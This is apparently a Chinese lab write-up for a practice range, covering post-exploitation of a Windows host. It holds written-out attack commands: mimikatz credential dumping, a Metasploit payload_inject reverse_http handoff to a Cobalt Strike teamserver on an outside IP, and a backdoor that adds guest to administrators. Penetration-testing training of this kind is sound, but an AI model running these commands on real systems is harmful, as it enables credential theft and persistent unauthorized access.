+&lt;p&gt;将exe通过蚁剑丢到网站上&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688329368-361878d9-560f-4dda-b51e-fc2c4e08103e.png&#34;
+	width=&#34;503&#34;
+	height=&#34;334&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688329368-361878d9-560f-4dda-b51e-fc2c4e08103e_hu3505ef5a1a93340622f77d217b0e219c_25085_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688329368-361878d9-560f-4dda-b51e-fc2c4e08103e_hu3505ef5a1a93340622f77d217b0e219c_25085_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;150&#34;
+		data-flex-basis=&#34;361px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688363711-3608c005-510c-43dd-880f-08ccbf3be637.png&#34;
+	width=&#34;879&#34;
+	height=&#34;135&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688363711-3608c005-510c-43dd-880f-08ccbf3be637_hudb91b84f921b6fb6e0ec024415511b6f_67519_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688363711-3608c005-510c-43dd-880f-08ccbf3be637_hudb91b84f921b6fb6e0ec024415511b6f_67519_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;651&#34;
+		data-flex-basis=&#34;1562px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;连上&lt;/p&gt;
+&lt;h4 id=&#34;1提权&#34;&gt;1.提权
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688507671-7021f8f0-67c1-4266-a844-41bd2a24d394.png&#34;
+	width=&#34;415&#34;
+	height=&#34;70&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688507671-7021f8f0-67c1-4266-a844-41bd2a24d394_hu6addccd75d90b84d44d6370ccc90aa89_23082_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720688507671-7021f8f0-67c1-4266-a844-41bd2a24d394_hu6addccd75d90b84d44d6370ccc90aa89_23082_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;592&#34;
+		data-flex-basis=&#34;1422px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;由于直接就是administrator,所以可以直接提权到system&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720753064267-de067716-444b-4867-87e7-980900b8332d.png&#34;
+	width=&#34;847&#34;
+	height=&#34;152&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720753064267-de067716-444b-4867-87e7-980900b8332d_hu159a504a8788d5b546d53ec21b514556_86449_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720753064267-de067716-444b-4867-87e7-980900b8332d_hu159a504a8788d5b546d53ec21b514556_86449_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;557&#34;
+		data-flex-basis=&#34;1337px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;2获取账号密码&#34;&gt;2.获取账号密码
+&lt;/h4&gt;&lt;h5 id=&#34;font-stylecolorrgb77-77-771导入账号密码hash值font&#34;&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;1.导入账号，密码hash值：&lt;/font&gt;
+&lt;/h5&gt;&lt;p&gt;使用&lt;code&gt;windows/gather/smart_hashdump&lt;/code&gt;模块&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720753815836-a4565426-c004-4aa8-890a-3e5b941c4ca6.png&#34;
+	width=&#34;1058&#34;
+	height=&#34;370&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720753815836-a4565426-c004-4aa8-890a-3e5b941c4ca6_hu9f18a42ecc7f7bbfb0199855a0bf91c4_304337_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720753815836-a4565426-c004-4aa8-890a-3e5b941c4ca6_hu9f18a42ecc7f7bbfb0199855a0bf91c4_304337_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;285&#34;
+		data-flex-basis=&#34;686px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2mimikatz&#34;&gt;2.mimikatz
+&lt;/h5&gt;&lt;p&gt;加载mimikatz模块&lt;/p&gt;
+&lt;p&gt;要先将进程迁移到x64且权限为system的进程去&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ps
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;migrate pid
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;load kiwi 加载kiwi
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;creds_all 列举系统的明文密码
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720770247713-7970fab3-b67e-4a30-952c-42de92195c5f.png&#34;
+	width=&#34;1117&#34;
+	height=&#34;149&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720770247713-7970fab3-b67e-4a30-952c-42de92195c5f_hue55c39f7c6f701d0056d3321b1f8bdf5_67379_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720770247713-7970fab3-b67e-4a30-952c-42de92195c5f_hue55c39f7c6f701d0056d3321b1f8bdf5_67379_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;749&#34;
+		data-flex-basis=&#34;1799px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;cs上线&#34;&gt;cs上线
+&lt;/h3&gt;&lt;p&gt;cs连上我的云服务器&lt;/p&gt;
+&lt;h4 id=&#34;cs生成木马&#34;&gt;cs生成木马
+&lt;/h4&gt;&lt;p&gt;开启一个监听器&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721093501063-07150053-b203-4bf1-9002-228dd0c76473.png&#34;
+	width=&#34;687&#34;
+	height=&#34;685&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721093501063-07150053-b203-4bf1-9002-228dd0c76473_hu75ba8e4e5ce472e7604e77eed10b1f81_96223_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721093501063-07150053-b203-4bf1-9002-228dd0c76473_hu75ba8e4e5ce472e7604e77eed10b1f81_96223_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;100&#34;
+		data-flex-basis=&#34;240px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不知道为什么这里一定要80端口&lt;/p&gt;
+&lt;p&gt;cs生成木马&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032708478-bcad281d-e773-47bc-8175-580fc6a86dfe.png&#34;
+	width=&#34;456&#34;
+	height=&#34;225&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032708478-bcad281d-e773-47bc-8175-580fc6a86dfe_hu97c9a4c106a08955353bafeb471fa06b_60842_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032708478-bcad281d-e773-47bc-8175-580fc6a86dfe_hu97c9a4c106a08955353bafeb471fa06b_60842_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;202&#34;
+		data-flex-basis=&#34;486px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里用的payload是上面那个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032732524-2f1a6354-2ddb-43c8-9f0e-619557a9783d.png&#34;
+	width=&#34;606&#34;
+	height=&#34;398&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032732524-2f1a6354-2ddb-43c8-9f0e-619557a9783d_hu42c4152a5db1448f7d6f60b426c365dd_84861_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032732524-2f1a6354-2ddb-43c8-9f0e-619557a9783d_hu42c4152a5db1448f7d6f60b426c365dd_84861_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;365px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;生成了木马,通过蚁剑将木马上传到服务器上&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032829389-6521c43d-7d93-49f1-843a-a3f543e7ab2b.png&#34;
+	width=&#34;348&#34;
+	height=&#34;228&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032829389-6521c43d-7d93-49f1-843a-a3f543e7ab2b_hu7f3879344663ba50b67a5fdaf4952d69_10958_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721032829389-6521c43d-7d93-49f1-843a-a3f543e7ab2b_hu7f3879344663ba50b67a5fdaf4952d69_10958_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;366px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;蚁剑上运行&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721093581133-52fcff78-e0ec-412d-b7be-3cc986b955a6.png&#34;
+	width=&#34;1017&#34;
+	height=&#34;105&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721093581133-52fcff78-e0ec-412d-b7be-3cc986b955a6_hud0bd60fbd28626bfca6a009ba216492c_36400_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721093581133-52fcff78-e0ec-412d-b7be-3cc986b955a6_hud0bd60fbd28626bfca6a009ba216492c_36400_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;968&#34;
+		data-flex-basis=&#34;2324px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上线了&lt;/p&gt;
+&lt;h3 id=&#34;font-stylecolorrgb79-79-79msf-联动-cobaltstrikefont&#34;&gt;&lt;font style=&#34;color:rgb(79, 79, 79);&#34;&gt;msf 联动 cobaltstrike&lt;/font&gt;
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;msf获取到shell后，可以在提权后派发给cobaltstrike&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;我这里是将server放到云服务器上&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash teamserver 116.205.225.75 123456
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721003834769-ac049ee4-34e0-4c00-9431-e77c4f368b08.png&#34;
+	width=&#34;905&#34;
+	height=&#34;492&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721003834769-ac049ee4-34e0-4c00-9431-e77c4f368b08_hu37a3f1d061b3fddd95e0013c490b3695_45810_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721003834769-ac049ee4-34e0-4c00-9431-e77c4f368b08_hu37a3f1d061b3fddd95e0013c490b3695_45810_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;183&#34;
+		data-flex-basis=&#34;441px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;首先cobaltstrike创建监听器：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094135399-8809146b-924d-4e01-82e3-dd0cd8575535.png&#34;
+	width=&#34;679&#34;
+	height=&#34;493&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094135399-8809146b-924d-4e01-82e3-dd0cd8575535_hufc84460dde5ddabba4dfb081683655df_66442_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094135399-8809146b-924d-4e01-82e3-dd0cd8575535_hufc84460dde5ddabba4dfb081683655df_66442_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;330px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;msf先要连上服务器&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;  use exploit/windows/local/payload_inject 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;payload_inject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;  &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; PAYLOAD windows/meterpreter/reverse_http   &lt;span class=&#34;c1&#34;&gt;# cs监听器中相同&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;payload_inject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; DisablePayloadHandler &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; 				  &lt;span class=&#34;c1&#34;&gt;# 告诉msf已建立监听，不必新建监听&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;payload_inject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 192.168.229.143 					  &lt;span class=&#34;c1&#34;&gt;# cs的IP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;payload_inject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;3333&lt;/span&gt; 								  &lt;span class=&#34;c1&#34;&gt;# cs监听器中监听的端口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;payload_inject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SESSION &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;payload_inject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094122921-0202c30b-b0c0-40f3-9754-3a70a746f716.png&#34;
+	width=&#34;1029&#34;
+	height=&#34;121&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094122921-0202c30b-b0c0-40f3-9754-3a70a746f716_huc9552c6bb77845d8151edf9aa26d5ed4_53023_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094122921-0202c30b-b0c0-40f3-9754-3a70a746f716_huc9552c6bb77845d8151edf9aa26d5ed4_53023_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;850&#34;
+		data-flex-basis=&#34;2040px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;1cs提权&#34;&gt;1.cs提权
+&lt;/h4&gt;&lt;h4 id=&#34;2cs获取账号密码&#34;&gt;2.cs获取账号密码
+&lt;/h4&gt;&lt;p&gt;查看用户hash值&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094765556-693306a9-b62e-4a2e-b69b-8aed7a3ca09d.png&#34;
+	width=&#34;1209&#34;
+	height=&#34;602&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094765556-693306a9-b62e-4a2e-b69b-8aed7a3ca09d_hu2ea820534104ca50b9408cd8d3fea568_339703_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721094765556-693306a9-b62e-4a2e-b69b-8aed7a3ca09d_hu2ea820534104ca50b9408cd8d3fea568_339703_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;200&#34;
+		data-flex-basis=&#34;481px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用mimikatz&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095063377-2154d4fd-b0bd-46ea-af07-752d2602cb76.png&#34;
+	width=&#34;660&#34;
+	height=&#34;438&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095063377-2154d4fd-b0bd-46ea-af07-752d2602cb76_hu354e76c300d1d0218d4665a03d672577_131868_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095063377-2154d4fd-b0bd-46ea-af07-752d2602cb76_hu354e76c300d1d0218d4665a03d672577_131868_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;150&#34;
+		data-flex-basis=&#34;361px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095190186-8a0b5691-586b-4c31-84b8-9c687d56a5d9.png&#34;
+	width=&#34;558&#34;
+	height=&#34;272&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095190186-8a0b5691-586b-4c31-84b8-9c687d56a5d9_hu4a432624d55f211f9a2f807917641b73_49788_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095190186-8a0b5691-586b-4c31-84b8-9c687d56a5d9_hu4a432624d55f211f9a2f807917641b73_49788_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;205&#34;
+		data-flex-basis=&#34;492px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;破解到账号密码&lt;/p&gt;
+&lt;p&gt;可以查看登录凭证&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095353403-61dba466-2f2d-4448-ae65-207edc854370.png&#34;
+	width=&#34;940&#34;
+	height=&#34;608&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095353403-61dba466-2f2d-4448-ae65-207edc854370_hu95581d6603b164d626576c8b1dcb3fa1_158771_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721095353403-61dba466-2f2d-4448-ae65-207edc854370_hu95581d6603b164d626576c8b1dcb3fa1_158771_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;371px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;留后门&#34;&gt;留后门
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell net user									 &lt;span class=&#34;c1&#34;&gt;# 查看本机用户&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell net user guest /active:yes						 &lt;span class=&#34;c1&#34;&gt;# 激活guest&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell net user guest Aa123456					 &lt;span class=&#34;c1&#34;&gt;# 给Guest用户设置密码&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell net localgroup administrators guest /add    &lt;span class=&#34;c1&#34;&gt;# 将guest加入到管理员中&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721097861031-33107bfd-5761-44cd-b085-655429b1bead.png&#34;
+	width=&#34;625&#34;
+	height=&#34;101&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721097861031-33107bfd-5761-44cd-b085-655429b1bead_hu489ae5a0ff57f581ed5cbad9eee18d15_30517_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721097861031-33107bfd-5761-44cd-b085-655429b1bead_hu489ae5a0ff57f581ed5cbad9eee18d15_30517_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;618&#34;
+		data-flex-basis=&#34;1485px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721098196220-77b68328-9dc3-40a4-be91-38d5e2a56914.png&#34;
+	width=&#34;807&#34;
+	height=&#34;239&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721098196220-77b68328-9dc3-40a4-be91-38d5e2a56914_hu9041e710322d42786298572c12e2d3c5_65362_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721098196220-77b68328-9dc3-40a4-be91-38d5e2a56914_hu9041e710322d42786298572c12e2d3c5_65362_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;337&#34;
+		data-flex-basis=&#34;810px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;guest用户启用不了&lt;/p&gt;
+&lt;h3 id=&#34;远程连接&#34;&gt;远程连接
+&lt;/h3&gt;&lt;p&gt;windows远程连接需要开启3389端口(远程连接端口)&lt;/p&gt;
+&lt;p&gt;msf进入shell&lt;code&gt;netstat -an | find &amp;quot;3389&amp;quot; &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;或者nmap查看3389端口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -p 3389 ip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;通过远程桌面连接&lt;/p&gt;
